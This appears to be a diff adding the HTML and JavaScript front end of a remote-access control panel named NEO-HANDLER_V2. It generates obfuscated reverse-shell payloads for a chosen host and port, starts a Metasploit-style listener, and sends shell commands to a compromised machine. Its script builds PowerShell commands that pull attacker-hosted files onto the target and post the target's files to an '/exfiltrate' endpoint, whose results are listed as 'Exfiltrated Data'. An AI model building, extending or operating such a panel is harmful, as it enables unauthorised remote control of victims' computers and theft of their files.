@@ -1,0 +1,455 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>NEO-HANDLER | V2.0</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;500;800&family=Orbitron:wght@400;900&display=swap" rel="stylesheet"/>
+<style>
+  :root {
+    --neon-red: #ff003c;
+    --neon-glow: rgba(255, 0, 60, 0.4);
+    --bg-dark: #050506;
+    --panel-bg: rgba(15, 15, 20, 0.85);
+    --border-color: rgba(255, 0, 60, 0.3);
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    background-color: var(--bg-dark);
+    background-image: 
+      linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%),
+      linear-gradient(90deg, rgba(255, 0, 0, 0.05), rgba(0, 255, 0, 0.01), rgba(0, 0, 255, 0.05));
+    background-size: 100% 4px, 3px 100%;
+    color: #e0e0e0;
+    font-family: 'JetBrains Mono', monospace;
+    height: 100vh;
+    overflow: hidden;
+  }
+
+  /* Animated Hex Grid Background */
+  .grid-bg {
+    position: fixed;
+    top: 0; left: 0; width: 100%; height: 100%;
+    background: url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNjAiIGhlaWdodD0iMTA0IiB2aWV3Qm94PSIwIDAgNjAgMTA0IiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxwYXRoIGQ9Ik02MCAxMDRWODZMNzAgODBMNjAgNzRWMzZMNzAgMzBMNjAgMjRWMGgtMnYyNEw0OCAzMGwxMCA2djM4bC0xMCA2IDEwIDZ2MThoMnptLTIgODRMMzggOTRMNTAgODhsMTAgNnYxMnoiIGZpbGw9IiNmZjAwM2MiIGZpbGwtb3BhY2l0eT0iMC4wNSIvPjwvc3ZnPg==');
+    z-index: -1;
+    animation: backgroundScroll 60s linear infinite;
+  }
+
+  @keyframes backgroundScroll {
+    from { background-position: 0 0; }
+    to { background-position: 0 1000px; }
+  }
+
+  #app {
+    display: grid;
+    grid-template-areas: 
+      "header header"
+      "sidebar main"
+      "footer footer";
+    grid-template-columns: 350px 1fr;
+    grid-template-rows: 70px 1fr 40px;
+    height: 100vh;
+    gap: 15px;
+    padding: 15px;
+  }
+
+  header {
+    grid-area: header;
+    background: var(--panel-bg);
+    border: 1px solid var(--border-color);
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 0 30px;
+    box-shadow: 0 0 20px rgba(0,0,0,0.5);
+    clip-path: polygon(0 0, 100% 0, 98% 100%, 2% 100%);
+  }
+
+  .logo {
+    font-family: 'Orbitron';
+    font-weight: 900;
+    font-size: 24px;
+    letter-spacing: 5px;
+    color: var(--neon-red);
+    text-shadow: 0 0 10px var(--neon-red);
+    animation: glitch 3s infinite;
+  }
+
+  @keyframes glitch {
+    0% { transform: skew(0deg); }
+    1% { transform: skew(10deg); opacity: 0.5; }
+    2% { transform: skew(-10deg); opacity: 1; }
+    3% { transform: skew(0deg); }
+  }
+
+  /* Layout Containers */
+  .sidebar { grid-area: sidebar; display: flex; flex-direction: column; gap: 15px; overflow-y: auto; }
+  .main-content { grid-area: main; display: flex; flex-direction: column; gap: 15px; overflow-y: auto; }
+
+  .pane {
+    background: var(--panel-bg);
+    border: 1px solid var(--border-color);
+    border-top: 3px solid var(--neon-red);
+    padding: 20px;
+    position: relative;
+    transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+  }
+
+  .pane:hover {
+    box-shadow: 0 0 25px rgba(255, 0, 60, 0.15);
+    border-color: var(--neon-red);
+  }
+
+  .pane-title {
+    font-family: 'Orbitron';
+    font-size: 11px;
+    text-transform: uppercase;
+    color: #ff7e9d;
+    margin-bottom: 15px;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+
+  .pane-title::after {
+    content: ""; flex: 1; height: 1px; background: linear-gradient(90deg, var(--border-color), transparent);
+  }
+
+  /* Realistic Inputs */
+  input, textarea {
+    width: 100%;
+    background: rgba(0, 0, 0, 0.5);
+    border: 1px solid #333;
+    color: #00ff41; /* Classic Matrix Green for code/input */
+    padding: 10px;
+    font-family: 'JetBrains Mono';
+    margin-bottom: 10px;
+    border-radius: 4px;
+    outline: none;
+    transition: 0.2s;
+  }
+
+  input:focus { border-color: var(--neon-red); box-shadow: 0 0 8px var(--neon-glow); }
+
+  /* CTF Style Buttons */
+  .btn-group { display: flex; gap: 10px; }
+  .btn {
+    padding: 12px;
+    border: 1px solid var(--neon-red);
+    background: rgba(255, 0, 60, 0.05);
+    color: var(--neon-red);
+    cursor: pointer;
+    font-family: 'Orbitron';
+    font-size: 10px;
+    font-weight: bold;
+    text-transform: uppercase;
+    transition: 0.2s;
+    position: relative;
+    overflow: hidden;
+    flex: 1;
+  }
+
+  .btn::before {
+    content: ""; position: absolute; top: 0; left: -100%; width: 100%; height: 100%;
+    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent);
+    transition: 0.4s;
+  }
+
+  .btn:hover::before { left: 100%; }
+  .btn:hover { background: var(--neon-red); color: white; box-shadow: 0 0 15px var(--neon-red); }
+  .btn:active { transform: translateY(2px); }
+  .btn:disabled { opacity: 0.3; cursor: not-allowed; filter: grayscale(1); }
+
+  /* Terminal Styling */
+  .terminal {
+    background: #000;
+    border: 1px solid #222;
+    height: 100%;
+    min-height: 300px;
+    padding: 15px;
+    overflow-y: auto;
+    font-size: 13px;
+    line-height: 1.5;
+    color: #ff4d4d;
+    position: relative;
+    box-shadow: inset 0 0 30px rgba(255,0,0,0.1);
+  }
+
+  .terminal::after {
+    content: ""; position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+    background: linear-gradient(transparent 50%, rgba(0,0,0,0.1) 50%);
+    background-size: 100% 4px; pointer-events: none;
+  }
+
+  .status-tag {
+    padding: 2px 10px;
+    border-radius: 10px;
+    font-size: 10px;
+    font-weight: bold;
+    border: 1px solid;
+  }
+
+  .online { color: #00ff41; border-color: #00ff41; background: rgba(0,255,65,0.1); box-shadow: 0 0 10px rgba(0,255,65,0.2); }
+  .offline { color: #ff003c; border-color: #ff003c; background: rgba(255,0,60,0.1); }
+
+  ::-webkit-scrollbar { width: 4px; }
+  ::-webkit-scrollbar-thumb { background: var(--neon-red); }
+</style>
+</head>
+<body>
+  <div class="grid-bg"></div>
+  <div id="app">
+    <header>
+      <div class="logo">NEO-HANDLER_V2</div>
+      <div id="connection-status" class="status-tag offline">SYSTEM OFFLINE</div>
+    </header>
+
+    <div class="sidebar">
+      <div class="pane">
+        <div class="pane-title">Connection Parameters</div>
+        <label style="font-size: 9px; color: #888;">LHOST</label>
+        <input id="lhost" type="text" value="0.0.0.0"/>
+        <label style="font-size: 9px; color: #888;">LPORT</label>
+        <input id="port" type="number" value="4444"/>
+        <div class="btn-group">
+          <button class="btn" id="btn-generate">Gen Payload</button>
+          <button class="btn" id="btn-start">Listen</button>
+        </div>
+        <button class="btn" id="btn-stop" disabled style="width:100%; margin-top:10px; border-color:#555; color:#888;">Kill Process</button>
+      </div>
+
+      <div class="pane" style="flex:1; display:flex; flex-direction:column;">
+        <div class="pane-title">Exfiltrated Data</div>
+        <div id="downloads-list" style="flex:1; font-size:11px; overflow-y:auto; margin-bottom:8px;"></div>
+        <button class="btn" id="btn-refresh-dl" style="width:100%; margin-top:10px;">Sync Storage</button>
+      </div>
+    </div>
+
+    <div class="main-content">
+      <div class="pane" style="height: 40%;">
+        <div class="pane-title" style="justify-content:space-between;">
+          <span>Obfuscated Vectors</span>
+          <button id="btn-copy" style="background:none; border:none; color:var(--neon-red); cursor:pointer; font-size:10px;">[COPY TO CLIPBOARD]</button>
+        </div>
+        <textarea id="payload-out" style="height: calc(100% - 40px); color: #00ff41;" readonly placeholder="Awaiting payload generation..."></textarea>
+      </div>
+
+      <div class="pane" style="flex:1; display:flex; flex-direction:column;">
+        <div class="pane-title">Remote Shell Access</div>
+        <div class="terminal" id="console">Initializing system kernels...</div>
+        <div style="display:flex; gap:10px; margin-top:10px;">
+          <input id="shell-input" type="text" placeholder="execute_remote_command >" style="margin-bottom:0; flex:1;"/>
+          <button class="btn" id="btn-send-cmd" style="flex:0 0 100px;">Send</button>
+        </div>
+      </div>
+      
+      <div class="pane">
+        <div class="pane-title">File Transfer Protocol</div>
+        <div style="display:grid; grid-template-columns: 1fr 1fr; gap:20px;">
+          <div>
+            <input type="file" id="upload-file" style="font-size:10px; background:transparent; border:none; padding:0;"/>
+            <button class="btn" id="btn-upload" style="width:100%;">Upload to Target</button>
+          </div>
+          <div>
+            <input type="text" id="download-path" placeholder="C:\\Remote\\Path\\file.txt" style="font-size:10px;"/>
+            <button class="btn" id="btn-download" style="width:100%;">Pull from Target</button>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <footer style="grid-area: footer; font-size: 9px; display:flex; align-items:center; justify-content:center; color:#444; border-top:1px solid #111;">
+      ENCRYPTED CHANNEL SECURED // 256-BIT // SESSION ID: <span id="session-id" style="margin-left:5px; color:#666;"></span>
+    </footer>
+  </div>
+
+<script>
+  const $ = s => document.querySelector(s);
+  let logOffset = 0;
+  
+  // Set random session ID
+  $('#session-id').innerText = Math.random().toString(16).substr(2, 12).toUpperCase();
+
+  function log(msg) {
+    const c = $('#console');
+    const line = document.createElement('div');
+    line.innerHTML = `<span style="color:#666;">[${new Date().toLocaleTimeString()}]</span> <span style="color:white;">$</span> ${msg}`;
+    c.appendChild(line);
+    c.scrollTop = c.scrollHeight;
+  }
+
+  async function pollLogs() {
+    try {
+      const resp = await fetch(`/listener/logs?offset=${logOffset}`);
+      const data = await resp.json();
+      if(data.logs && data.logs.length) {
+        data.logs.forEach(line => log(line));
+        logOffset += data.logs.length;
+      }
+      if($('#connection-status').classList.contains('online')) {
+        setTimeout(pollLogs, 1200);
+      }
+    } catch(e) {}
+  }
+
+  $('#btn-generate').onclick = async () => {
+    const lhost = $('#lhost').value || '0.0.0.0';
+    const port = $('#port').value;
+    log(`Encrypting payload for ${lhost}:${port}...`);
+    const resp = await fetch('/generate', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ ip: lhost, port: parseInt(port) })
+      });
+    const data = await resp.json();
+    if(data.payload) {
+      $('#payload-out').value = data.payload;
+      log("Payload ready. Vector obfuscated.");
+    }
+  };
+
+  $('#btn-start').onclick = async () => {
+    const lhost = $('#lhost').value || '0.0.0.0';
+    const port = $('#port').value;
+    $('#btn-start').disabled = true;
+    log(`Waking Metasploit daemon on port ${port}...`);
+    
+    const resp = await fetch('/listener/start', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ lhost: lhost, lport: parseInt(port) })
+    });
+    const data = await resp.json();
+    if(data.success) {
+      $('#connection-status').innerText = "SYSTEM ACTIVE";
+      $('#connection-status').className = "status-tag online";
+      $('#btn-stop').disabled = false;
+      pollLogs();
+    }
+  };
+
+  $('#btn-stop').onclick = async () => {
+    await fetch('/listener/stop', { method: 'POST' });
+    location.reload();
+  };
+
+  $('#btn-send-cmd').onclick = async () => {
+    const cmd = $('#shell-input').value;
+    if(!cmd) return;
+    await fetch('/listener/send', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ command: cmd })
+    });
+    $('#shell-input').value = '';
+  };
+
+  $('#btn-copy').onclick = () => {
+    $('#payload-out').select();
+    document.execCommand('copy');
+    log("Payload copied to clipboard.");
+  };
+
+  // Upload to target
+  $('#btn-upload').addEventListener('click', async () => {
+    const fileInput = $('#upload-file');
+    if(!fileInput.files.length) return log("[-] No file selected");
+    const file = fileInput.files[0];
+    const formData = new FormData();
+    formData.append('file', file);
+    log(`[*] Uploading ${file.name} to Flask server...`);
+    try {
+      const resp = await fetch('/upload_to_flask', { method: 'POST', body: formData });
+      const data = await resp.json();
+      if(data.success) {
+        log(`[+] File saved on Flask as ${data.filename}`);
+        const flaskIp = window.location.hostname;
+        const flaskPort = window.location.port;
+        const url = `http://${flaskIp}:${flaskPort}/uploads/${data.filename}`;
+        const psCmd = `Invoke-WebRequest -Uri "${url}" -OutFile "${data.filename}"`;
+        log(`[*] Sending command to target: ${psCmd}`);
+        await fetch('/listener/send', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ command: psCmd })
+        });
+        log(`[+] Upload command sent.`);
+        fileInput.value = '';
+      } else {
+        log(`[-] Upload failed: ${data.error}`);
+      }
+    } catch(e) { log(`[-] Upload error: ${e.message}`); }
+  });
+
+  // Download from target
+  $('#btn-download').addEventListener('click', async () => {
+    const remotePath = $('#download-path').value.trim();
+    if(!remotePath) return log("[-] No remote path provided");
+    const filename = remotePath.split('\\\\').pop().split('/').pop();
+    const flaskIp = window.location.hostname;
+    const flaskPort = window.location.port;
+    const url = `http://${flaskIp}:${flaskPort}/exfiltrate?filename=${filename}`;
+    const psCmd = `Invoke-RestMethod -Uri "${url}" -Method Post -InFile "${remotePath}"`;
+    log(`[*] Sending command to target: ${psCmd}`);
+    try {
+      await fetch('/listener/send', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ command: psCmd })
+      });
+      log(`[+] Download command sent. Wait a moment and refresh local downloads.`);
+      $('#download-path').value = '';
+    } catch(e) { log(`[-] Download error: ${e.message}`); }
+  });
+
+  // Refresh downloads
+  async function refreshDownloads() {
+    try {
+      const resp = await fetch('/downloads_list');
+      const data = await resp.json();
+      const list = $('#downloads-list');
+      list.innerHTML = '';
+      if(data.files && data.files.length) {
+        data.files.forEach(f => {
+          const a = document.createElement('a');
+          a.href = `/downloads/${f}`;
+          a.innerText = f;
+          a.target = '_blank';
+          a.download = f;
+          a.style.color = '#ff4444';
+          a.style.display = 'block';
+          a.style.marginBottom = '4px';
+          list.appendChild(a);
+        });
+      } else {
+        list.innerText = 'No files downloaded yet.';
+      }
+    } catch(e) {}
+  }
+  $('#btn-refresh-dl').addEventListener('click', refreshDownloads);
+  refreshDownloads();
+  
+  // Enter key for shell
+  $('#shell-input').addEventListener('keypress', (e) => {
+    if(e.key === 'Enter') $('#btn-send-cmd').click();
+  });
+
+  // initial status fetch
+  window.onload = async () => {
+    try {
+      const r = await fetch('/listener/status');
+      const d = await r.json();
+      if(d.running) {
+        $('#connection-status').innerText = 'SYSTEM ACTIVE';
+        $('#connection-status').className = 'status-tag online';
+        $('#btn-start').disabled = true;
+        $('#btn-stop').disabled = false;
+        pollLogs();
+      }
+    } catch(e) {}
+  };
+</script>
+</body>
+</html>
